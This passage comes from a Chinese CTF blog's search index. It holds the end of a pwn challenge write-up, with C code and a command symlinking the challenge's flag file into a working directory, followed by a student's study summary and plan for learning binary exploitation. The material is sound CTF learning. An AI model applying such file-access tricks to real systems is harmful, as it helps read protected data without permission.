env);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们还没有完全成功，因为当前目录下没有flag,所以我们可以在当前目录下创建一个符号连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input2@ubuntu:/tmp/jl2$ ln -sf /home/input2/flag flag</span><br></pre></td></tr></table></figure>

<p>现在再编译运行就成功了。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
  <entry>
    <title>近期学习总结以及今后stage</title>
    <url>/year/07/05/cl7iordpy003p293fvcftpygv/</url>
    <content><![CDATA[<h1 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h1><h2 id="第一阶段：pwn意义探索与工具初步了解"><a href="#第一阶段：pwn意义探索与工具初步了解" class="headerlink" title="第一阶段：pwn意义探索与工具初步了解"></a>第一阶段：pwn意义探索与工具初步了解</h2><p><strong>在这一阶段主要是迷茫的探索期，具体指大一上办学期</strong>。一开始连shell是什么都不太清楚，做题的时候不知道做题的目的是什么，网上搜到的题目，writeup也看不懂，很迷茫。这个时候其实没有很好的求教大师傅，走了很多弯路。不过这时自学尽头足，动力强。还是把深入理解计算机系统的前三四章给看了，王爽的汇编语言看了一部分。在suctf招新赛后，也才刚能写出带system函数的栈溢出题。总得来说大一上学期还是打下了一个好的底层基础的。这一阶段的收获主要是：</p>
<a id="more"></a>
<ul>
<li>掌握了基本的计算机体系结构</li>
<li>基本的汇编指令，并且初步熟悉函数调用栈的过程</li>
<li>IDA pro以及pwntools和gdb的一些用法</li>
<li>html,css,js和vue</li>
</ul>
<h2 id="第二阶段：学习方向的迷茫与人工智能的学习"><a href="#第二阶段：学习方向的迷茫与人工智能的学习" class="headerlink" title="第二阶段：学习方向的迷茫与人工智能的学习"></a>第二阶段：学习方向的迷茫与人工智能的学习</h2><p><strong>大一下半学期，在这一阶段对自己学习的重点方向产生了迷茫</strong>。由于报人工智能项目的缘故，寒假将主要的学习时间就花在了人工智能方向上，看了吴恩达的机器学习视频课。开学以后也是人工智能为主，而此时pwn的学习陷入了不晓继续学习学什么的困境。依然是除了接触过的题目类型，其它类型题目的writeup根本看不懂，虽然这时隐约知道应该要自学下链接的部分，但是因为时间精力的缘故一直也继续学习，直到参加几场比赛经历了自闭以后，同学校的大师傅交流了几次，才对rop有个了解，意识到还是要好好学一学。于是看了南大计算机系统基础的视频课，以及CSAPP的链接部分以及程序员的自我修养的前八章。这阶段的收获主要是：</p>
<ul>
<li>人工智能领域与机器学习的初步了解</li>
<li>利用tensorflow写cnn</li>
<li>动态链接和静态链接的了解</li>
<li>ROP题初步可以解决</li>
</ul>
<h2 id="今后学习规划"><a href="#今后学习规划" class="headerlink" title="今后学习规划"></a>今后学习规划</h2><p>暑假是一个学习的好时机，学习时间充分而自由。主要学习，完成数据结构作业，每天两小时的人工智能实验，每天至少两小时pwn题，平台主要就在xctf上。先把pwnable.kr上的题刷一遍，然后专题专刷一下rop的题目，接着就是ctfwiki上有关堆的例题在开学前一定全部搞懂。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
  </entry>
</search>
